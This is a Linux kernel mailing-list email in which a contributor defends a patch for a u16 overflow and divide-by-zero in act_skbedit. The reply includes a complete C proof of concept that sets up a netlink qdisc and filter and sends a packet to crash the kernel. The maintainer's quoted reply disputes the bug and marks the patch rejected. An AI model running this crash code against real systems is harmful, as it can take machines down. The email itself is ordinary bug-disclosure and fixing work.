Return-Path: <stable+bounces-216018-lists+stable=lfdr.de@vger.kernel.org>
Delivered-To: lists+stable@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id iP13Oa+ajmkKDQEAu9opvQ
	(envelope-from <stable+bounces-216018-lists+stable=lfdr.de@vger.kernel.org>)
	for <lists+stable@lfdr.de>; Fri, 13 Feb 2026 04:29:51 +0100
X-Original-To: lists+stable@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
	by mail.lfdr.de (Postfix) with ESMTPS id 92345132AA1
	for <lists+stable@lfdr.de>; Fri, 13 Feb 2026 04:29:51 +0100 (CET)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id 179E8308B747
	for <lists+stable@lfdr.de>; Fri, 13 Feb 2026 03:29:40 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 2070223EAB8;
	Fri, 13 Feb 2026 03:29:39 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="F1VLsLAM"
X-Original-To: stable@vger.kernel.org
Received: from mail-lj1-f182.google.com (mail-lj1-f182.google.com [209.85.208.182])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 669211EBA14
	for <stable@vger.kernel.org>; Fri, 13 Feb 2026 03:29:36 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.208.182
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1770953378; cv=pass; b=QkIViUMtNzTlySA6iIA4JrSQKRIG9bimyZwH1RkitDCki62OOBqVQ4ZappeuhZ3xyRf6KmV+3DzaNTY219/oxpl0HqrVQnVGvNJKR+2HPufs6LJiy7K4mZ4917G9jal9wizy6MMz6a0soEBeRiPYu+9X0e7P4GhggYhs9t14Vsw=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1770953378; c=relaxed/simple;
	bh=qwqfZnbx2HsQ5NxxoPtLpyXjqRzfdyqePmV74/IYCu8=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=FExywnjciKGG7CcDd86VxQ/RJTfJw/y95sGM5XD86SFw8CDslXtnmt+E0XQdlPi+SjBuuwK0P7dSfCb1YG8u/U2fXG/UomuCcgkTjoXkKDgvS9/Wr9ugkF0H8yidu17yiP7q/UuG4vMyEEf8eo7MoYZpklgEQdmUdShipSEtmZs=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=F1VLsLAM; arc=pass smtp.client-ip=209.85.208.182
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Received: by mail-lj1-f182.google.com with SMTP id 38308e7fff4ca-3870d178a9aso4298461fa.0
        for <stable@vger.kernel.org>; Thu, 12 Feb 2026 19:29:36 -0800 (PST)
ARC-Seal: i=1; a=rsa-sha256; t=1770953374; cv=none;
        d=google.com; s=arc-20240605;
        b=EwXens3ja7mud9tUftJXm2ISpDEhNKrG6jp+rZaiJ8UZXvtMjA6TERFUtBcEAg5eA6
         H9wKnXNEUtRkPtDKd8XsgmqQz9biojoR5FmIhvtvqw/hVdeUE+coPB4cgTmFPuQbK46Z
         +2c8XoJPMBh2GVr0lQt76WAOSRvvi82u79NK8hGmc15taoFH0mGZCDk7hXBdaIdG60EJ
         lqkdgyuC5YqTGjdd7qbx3OfVzdTYhLojEKrkn/3pLpFwlQt58Kb8FgNRwuuXgmGKrACY
         inZorHt4rVjqR/5pyu1DMHCXNM/WBq5zGI/EdKlYgYy6bVoUOhvBA3DyzkziQr2A/4wI
         phTA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=eBQ3lDumaxeXaYi2Bva1rDaT81lqwe2SMa0I53U5MFw=;
        fh=vNd+PhJzjwG7Xq/CBmoS0cukofDIeov+CuRzVmAJxpU=;
        b=OKC0LTJcuP5JNa73E3ACMYTO4jwk8CJbQv0qt76+l9Rv0FAz6C7l4aElWMXsNdTnaK
         JjNp1nlkIxNPqoUevXh7uCBg3l++cQoRswBD0CyYRjzMeFrA08MJLP4PzYva5AfLuSCZ
         OvuC8osYYGBv1K1dcUYne29OIuhOU/RqRrmdeklRpTVoS16z5P1+G9vL9vkB0q8zyGOM
         BGpqDycC0kGw2qwZzTa1bWDGENDAV0EuxgHjYSZylIzD4yZD0rxCF8hOcHoK16ZNz7ix
         4exSFW0pbCzf8MTb/dOsAxRsGmXGMLiTA2XItFXnHjkb0RiYEdylyRdLqQhKcEOmMlEc
         S6VQ==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1770953374; x=1771558174; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=eBQ3lDumaxeXaYi2Bva1rDaT81lqwe2SMa0I53U5MFw=;
        b=F1VLsLAMh7i/HU4o7di940Kyfl731qJ4TsXE02yD3b/ZhYK3RFIMbgYNO3fl+9+DAP
         kgwSU0WBceaXrRnLygTyRsltxyTrJoJlKQALkk15NnGMsQUlyyE8IrBjWokQkstp4gZi
         wWOqM4KgznQZyjS5V42kGXVvlo0QZopz+Cj2Abmkz7JlN3oDE2E7QThGJIER7cnQ+xHo
         qx3iGn9CVZL/3tN9I3GT08qEjgH5zK1UBeYNoL/jPNBotJSZVCMvuBPuREn1qPqJ0LC6
         3i3JHaMk7N4iVON8+pArmRMvmWPcJfMOVNekkgF13pPC3SAKFdM/uQdTO78tsd7pw8MR
         vYTQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1770953374; x=1771558174;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=eBQ3lDumaxeXaYi2Bva1rDaT81lqwe2SMa0I53U5MFw=;
        b=QmmqtLExeOdazsfVpUcKHqpJhxLh2JYzi4arPJqpqMMwdROcMq+JB55YokYrxOLqUS
         xo6Cj74rnoKKlG+ZYbaC71fHvidTW2PGE4KgzqKmxTuR11bRt0Gnqq0t3ZOuN05ghD+Y
         GiekzD4mk+jzWsLcNL4G2LsBaVqG9iqUgyQLFxVzmHUzsAXZBy61PK/2A58PiLT6xVJ1
         5Dr/6Xar8qEIkPrQ6GO700+crgv2W2guKVKMhOC6vIXEqscnt5ld8bIqq27u1pCORNaY
         a2asqrHikXpu61GhHlrWYnFV2+h2wuVF/BgO6Gz5Agm7UTaQtF/9PvtiLE+s6/17+1pg
         TbOg==
X-Forwarded-Encrypted: i=1; AJvYcCXcn/3aRoraOS59uZxpnFdjYzajQiCOJix8IUTy5nwJ7Fl7mIitExmKGgF6OtPgd6f3bB2eAbE=@vger.kernel.org
X-Gm-Message-State: AOJu0Yye5lMvPMh8TlKWr4vRW76lFIIAvCOUunwiYZyDzoClRS1U5M9S
	1MKTmG/OIZAfn0ORkHaRebNP1rXB4RjbHaxhIouzucp8t/npyqMmLfYizXaPDfmj8fuzBkP07Ys
	U2PBfVWuZZgBjqA7p9X4z28j5y/fCvDE=
X-Gm-Gg: AZuq6aKoBLHCiD31H7Vq/HzQFrF6RAcfyliHd3DSgHb5RDyNfauDTFxZ2LMsU8ZuSf0
	CF6hgCxls2BeEyLOnzueI09pJZPYS/MkSgDmWY46NDhMi5YMmkCCizbGFsHIHya65J8KBPdQyfk
	Qot4/xDlUldp8Z/XerdjPmGc+eVHDMQlHtE62OeVzX7+KHTp21wteN/kfEx1SKpycqP1OGdgXJM
	/FwwH3ijC1/b00rSEdv8S35R+GhXDlwztVl6r/eSOPlGkWIJHCjxj4FX3ql8gSf297lX+Mcr0zH
	+FjDOEpybTIbwvyniZIq0YIwE789zJo5wsnANuVd
X-Received: by 2002:a05:651c:2104:b0:386:fd3e:bfe8 with SMTP id
 38308e7fff4ca-3881050c05emr1382511fa.7.1770953374140; Thu, 12 Feb 2026
 19:29:34 -0800 (PST)
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260211184848.731894-1-cnitlrt@gmail.com> <20260211194325.797963-1-cnitlrt@gmail.com>
 <20260212180810.0b06e2b3@kernel.org>
In-Reply-To: <20260212180810.0b06e2b3@kernel.org>
From: RUITONG LIU <cnitlrt@gmail.com>
Date: Thu, 12 Feb 2026 20:29:20 -0700
X-Gm-Features: AZwV_QgIe--Qm-O7gqIhI9gFSqsATzo0hKlKisE_nb0WoW7_BBVlpX2QlaeVSBw
Message-ID: <CAK55_s5pR7KTMzNkHySK+XoGtv-WFdVe77PzD3+7uPuytYDNYg@mail.gmail.com>
Subject: Re: [PATCH v2] net/sched: act_skbedit: fix divide-by-zero in tcf_skbedit_hash()
To: Jakub Kicinski <kuba@kernel.org>
Cc: netdev@vger.kernel.org, jhs@mojatatu.com, xiyou.wangcong@gmail.com, 
	jiri@resnulli.us, davem@davemloft.net, edumazet@google.com, pabeni@redhat.com, 
	horms@kernel.org, linux-kernel@vger.kernel.org, stable@vger.kernel.org, 
	Shuyuan Liu <L0x1c3r@gmail.com>
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
X-Rspamd-Server: lfdr
X-Spamd-Result: default: False [-0.66 / 15.00];
	SUSPICIOUS_RECIPS(1.50)[];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=2];
	DMARC_POLICY_ALLOW(-0.50)[gmail.com,none];
	R_SPF_ALLOW(-0.20)[+ip4:172.234.253.10:c];
	R_DKIM_ALLOW(-0.20)[gmail.com:s=20230601];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	RCVD_TLS_LAST(0.00)[];
	TAGGED_FROM(0.00)[bounces-216018-lists,stable=lfdr.de];
	FROM_HAS_DN(0.00)[];
	RCVD_COUNT_THREE(0.00)[4];
	MIME_TRACE(0.00)[0:+];
	FORGED_SENDER_MAILLIST(0.00)[];
	RCPT_COUNT_TWELVE(0.00)[12];
	FREEMAIL_CC(0.00)[vger.kernel.org,mojatatu.com,gmail.com,resnulli.us,davemloft.net,google.com,redhat.com,kernel.org];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	FREEMAIL_FROM(0.00)[gmail.com];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[cnitlrt@gmail.com,stable@vger.kernel.org];
	DKIM_TRACE(0.00)[gmail.com:+];
	MID_RHS_MATCH_FROMTLD(0.00)[];
	ASN(0.00)[asn:63949, ipnet:172.234.224.0/19, country:SG];
	TAGGED_RCPT(0.00)[stable];
	MISSING_XM_UA(0.00)[];
	TO_DN_SOME(0.00)[]
X-Rspamd-Queue-Id: 92345132AA1
X-Rspamd-Action: no action

With queue_mapping =3D 0 and queue_mapping_max =3D 65535, the existing
validation passes because it only checks queue_mapping_max <
queue_mapping, which is false. The code then computes the inclusive
range size:
mapping_mod =3D queue_mapping_max - queue_mapping + 1 =3D 65536.
However, mapping_mod is stored in a u16, so 65536 wraps to 0. This 0
value is later used as the divisor in a modulo operation (hash %
mapping_mod), causing a divide-by-zero.

This is the poc, and we use agent found this bug
```c
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_ether.h>
#include <linux/netlink.h>
#include <linux/pkt_cls.h>
#include <linux/pkt_sched.h>
#include <linux/rtnetlink.h>
#include <linux/tc_act/tc_skbedit.h>
#include <net/if.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef SKBEDIT_F_TXQ_SKBHASH
#define SKBEDIT_F_TXQ_SKBHASH 0x40
#endif

#ifndef TCA_SKBEDIT_QUEUE_MAPPING_MAX
#define TCA_SKBEDIT_QUEUE_MAPPING_MAX 10
#endif

#define BUF_SIZE 8192

#define NLMSG_TAIL(nmsg) \
    ((struct nlattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))

static int addattr_l(struct nlmsghdr *n, size_t maxlen, int type,
                     const void *data, size_t alen) {
    size_t len =3D NLA_ALIGN(alen) + NLA_HDRLEN;
    size_t newlen =3D NLMSG_ALIGN(n->nlmsg_len) + len;
    if (newlen > maxlen)
        return -1;
    struct nlattr *na =3D NLMSG_TAIL(n);
    na->nla_type =3D type;
    na->nla_len =3D NLA_HDRLEN + alen;
    if (alen && data)
        memcpy((char *)na + NLA_HDRLEN, data, alen);
    n->nlmsg_len =3D newlen;
    return 0;
}

static struct nlattr *addattr_nest(struct nlmsghdr *n, size_t maxlen,
int type) {
    struct nlattr *start =3D NLMSG_TAIL(n);
    if (addattr_l(n, maxlen, type | NLA_F_NESTED, NULL, 0) < 0)
        return NULL;
    return start;
}

static int addattr_nest_end(struct nlmsghdr *n, struct nlattr *start) {
    start->nla_len =3D (char *)NLMSG_TAIL(n) - (char *)start;
    return n->nlmsg_len;
}

static int nl_talk(int fd, struct nlmsghdr *nlh) {
    struct sockaddr_nl nladdr =3D {0};
    nladdr.nl_family =3D AF_NETLINK;

    struct iovec iov =3D {0};
    iov.iov_base =3D nlh;
    iov.iov_len =3D nlh->nlmsg_len;

    struct msghdr msg =3D {0};
    msg.msg_name =3D &nladdr;
    msg.msg_namelen =3D sizeof(nladdr);
    msg.msg_iov =3D &iov;
    msg.msg_iovlen =3D 1;

    if (sendmsg(fd, &msg, 0) < 0)
        return -errno;

    char buf[BUF_SIZE];
    while (1) {
        int len =3D recv(fd, buf, sizeof(buf), 0);
        if (len < 0) {
            if (errno =3D=3D EINTR)
                continue;
            return -errno;
        }
        struct nlmsghdr *h;
        for (h =3D (struct nlmsghdr *)buf; NLMSG_OK(h, len);
             h =3D NLMSG_NEXT(h, len)) {
            if (h->nlmsg_type =3D=3D NLMSG_ERROR) {
                struct nlmsgerr *err =3D (struct nlmsgerr *)NLMSG_DATA(h);
                if (err->error =3D=3D 0)
                    return 0;
                return err->error;
            }
        }
    }
}

static int add_clsact_qdisc(int fd, int ifindex, int *seq) {
    struct {
        struct nlmsghdr n;
        struct tcmsg t;
        char buf[256];
    } req =3D {0};

    req.n.nlmsg_len =3D NLMSG_LENGTH(sizeof(struct tcmsg));
    req.n.nlmsg_type =3D RTM_NEWQDISC;
    req.n.nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE |
NLM_F_REPLACE;
    req.n.nlmsg_seq =3D ++(*seq);
    req.n.nlmsg_pid =3D getpid();

    req.t.tcm_family =3D AF_UNSPEC;
    req.t.tcm_ifindex =3D ifindex;
    req.t.tcm_parent =3D TC_H_CLSACT;
    req.t.tcm_handle =3D TC_H_MAKE(TC_H_INGRESS, 0);

    const char kind[] =3D "clsact";
    if (addattr_l(&req.n, sizeof(req), TCA_KIND, kind, sizeof(kind)) < 0)
        return -1;

    return nl_talk(fd, &req.n);
}

static int add_u32_filter_skbedit(int fd, int ifindex, int *seq) {
    struct {
        struct nlmsghdr n;
        struct tcmsg t;
        char buf[1024];
    } req =3D {0};

    req.n.nlmsg_len =3D NLMSG_LENGTH(sizeof(struct tcmsg));
    req.n.nlmsg_type =3D RTM_NEWTFILTER;
    req.n.nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_=
EXCL;
    req.n.nlmsg_seq =3D ++(*seq);
    req.n.nlmsg_pid =3D getpid();

    req.t.tcm_family =3D AF_UNSPEC;
    req.t.tcm_ifindex =3D ifindex;
    req.t.tcm_parent =3D TC_H_MAKE(TC_H_CLSACT, TC_H_MIN_EGRESS);
    req.t.tcm_handle =3D 0;
    req.t.tcm_info =3D TC_H_MAKE(1 << 16, htons(ETH_P_ALL));

    const char kind[] =3D "u32";
    if (addattr_l(&req.n, sizeof(req), TCA_KIND, kind, sizeof(kind)) < 0)
        return -1;

    struct nlattr *opts =3D addattr_nest(&req.n, sizeof(req), TCA_OPTIONS);
    if (!opts)
        return -1;

    /* u32 selector: one key that always matches */
    char selbuf[sizeof(struct tc_u32_sel) + sizeof(struct tc_u32_key)];
    memset(selbuf, 0, sizeof(selbuf));
    struct tc_u32_sel *sel =3D (struct tc_u32_sel *)selbuf;
    struct tc_u32_key *key =3D (struct tc_u32_key *)(sel->keys);

    sel->flags =3D TC_U32_TERMINAL;
    sel->offshift =3D 0;
    sel->nkeys =3D 1;
    sel->offmask =3D 0;
    sel->off =3D 0;
    sel->offoff =3D 0;
    sel->hoff =3D 0;
    sel->hmask =3D htonl(0);

    key->mask =3D 0;
    key->val =3D 0;
    key->off =3D 0;
    key->offmask =3D 0;

    if (addattr_l(&req.n, sizeof(req), TCA_U32_SEL, selbuf, sizeof(selbuf))=
 < 0)
        return -1;

    struct nlattr *act =3D addattr_nest(&req.n, sizeof(req), TCA_U32_ACT);
    if (!act)
        return -1;

    struct nlattr *act1 =3D addattr_nest(&req.n, sizeof(req), 1);
    if (!act1)
        return -1;

    const char act_kind[] =3D "skbedit";
    if (addattr_l(&req.n, sizeof(req), TCA_ACT_KIND, act_kind,
sizeof(act_kind)) < 0)
        return -1;

    struct nlattr *act_opts =3D addattr_nest(&req.n, sizeof(req),
TCA_ACT_OPTIONS);
    if (!act_opts)
        return -1;

    struct tc_skbedit parm =3D {0};
    parm.action =3D TC_ACT_OK;
    parm.index =3D 0;

    if (addattr_l(&req.n, sizeof(req), TCA_SKBEDIT_PARMS, &parm,
sizeof(parm)) < 0)
        return -1;

    uint16_t qmap =3D 0;
    uint16_t qmap_max =3D 0xFFFFu;
    uint64_t flags =3D SKBEDIT_F_TXQ_SKBHASH;

    if (addattr_l(&req.n, sizeof(req), TCA_SKBEDIT_QUEUE_MAPPING,
&qmap, sizeof(qmap)) < 0)
        return -1;
    if (addattr_l(&req.n, sizeof(req), TCA_SKBEDIT_QUEUE_MAPPING_MAX,
&qmap_max, sizeof(qmap_max)) < 0)
        return -1;
    if (addattr_l(&req.n, sizeof(req), TCA_SKBEDIT_FLAGS, &flags,
sizeof(flags)) < 0)
        return -1;

    addattr_nest_end(&req.n, act_opts);
    addattr_nest_end(&req.n, act1);
    addattr_nest_end(&req.n, act);
    addattr_nest_end(&req.n, opts);

    return nl_talk(fd, &req.n);
}

static int trigger_packet(const char *ifname) {
    int s =3D socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0)
        return -errno;

    if (ifname) {
        if (setsockopt(s, SOL_SOCKET, SO_BINDTODEVICE, ifname,
                       strlen(ifname) + 1) < 0) {
            int err =3D -errno;
            close(s);
            return err;
        }
    }

    struct sockaddr_in addr =3D {0};
    addr.sin_family =3D AF_INET;
    addr.sin_port =3D htons(12345);
    addr.sin_addr.s_addr =3D inet_addr("10.0.2.2");

    char buf[64] =3D "trigger";
    int ret =3D sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&addr,
sizeof(addr));
    if (ret < 0) {
        int err =3D -errno;
        close(s);
        return err;
    }

    close(s);
    return 0;
}

int main(void) {
    int fd =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (fd < 0) {
        perror("socket(NETLINK_ROUTE)");
        return 1;
    }

    struct sockaddr_nl local =3D {0};
    local.nl_family =3D AF_NETLINK;
    local.nl_pid =3D getpid();
    if (bind(fd, (struct sockaddr *)&local, sizeof(local)) < 0) {
        perror("bind");
        return 1;
    }

    const char *ifname =3D "eth0";
    int ifindex =3D if_nametoindex(ifname);
    if (!ifindex) {
        ifname =3D "lo";
        ifindex =3D if_nametoindex(ifname);
        if (!ifindex) {
            perror("if_nametoindex(eth0/lo)");
            return 1;
        }
    }

    int seq =3D 0;
    int err =3D add_clsact_qdisc(fd, ifindex, &seq);
    if (err && err !=3D -EEXIST) {
        fprintf(stderr, "add clsact qdisc failed: %s (%d)\n",
strerror(-err), err);
        return 1;
    }

    err =3D add_u32_filter_skbedit(fd, ifindex, &seq);
    if (err) {
        fprintf(stderr, "add u32 skbedit filter failed: %s (%d)\n",
strerror(-err), err);
        return 1;
    }

    err =3D trigger_packet(ifname);
    if (err) {
        fprintf(stderr, "trigger_packet failed: %s (%d)\n",
strerror(-err), err);
        return 1;
    }

    printf("skbedit filter installed and packet sent. Check kernel log
for crash/KASAN.\n");
    return 0;
}
```

Jakub Kicinski <kuba@kernel.org> =E4=BA=8E2026=E5=B9=B42=E6=9C=8812=E6=97=
=A5=E5=91=A8=E5=9B=9B 19:08=E5=86=99=E9=81=93=EF=BC=9A
>
> On Thu, 12 Feb 2026 03:43:25 +0800 Ruitong Liu wrote:
> > Commit 38a6f0865796 ("net: sched: support hash selecting tx queue")
> > added SKBEDIT_F_TXQ_SKBHASH support. mapping_mod is computed as:
> >
> >   mapping_mod =3D queue_mapping_max - queue_mapping + 1;
> >
> > mapping_mod is stored as u16, so the calculation can overflow when the
> > requested range covers 65536 queues (e.g. queue_mapping=3D0 and
> > queue_mapping_max=3D0xffff). In that case mapping_mod wraps to 0 and
> > tcf_skbedit_hash() triggers a divide-by-zero:
> >
> >   queue_mapping +=3D skb_get_hash(skb) % params->mapping_mod;
> >
> > Reject such invalid configuration to prevent mapping_mod from becoming
> > 0 and avoid the crash.
>
> How did you find this bug? Do you have a repro to trigger the issue
> you're describing?
>
> > @@ -194,6 +194,10 @@ static int tcf_skbedit_init(struct net *net, struc=
t nlattr *nla,
> >                       }
> >
> >                       mapping_mod =3D *queue_mapping_max - *queue_mappi=
ng + 1;
> > +                     if (!mapping_mod) {
> > +                             NL_SET_ERR_MSG_MOD(extack, "Invalid queue=
_mapping range: range too large");
> > +                             return -EINVAL;
> > +                     }
> >                       flags |=3D SKBEDIT_F_TXQ_SKBHASH;
> >               }
> >               if (*pure_flags & SKBEDIT_F_INHERITDSFIELD)
>
>
> There is this check right above the lines you're touching:
>
>                         if (*queue_mapping_max < *queue_mapping) {
>                                 NL_SET_ERR_MSG_MOD(extack, "The range of =
queue_mapping is invalid, max < min.");
>                                 return -EINVAL;
>                         }
>
> I don't see how mapping_mod can be 0 here.
> --
> pw-bot: reject

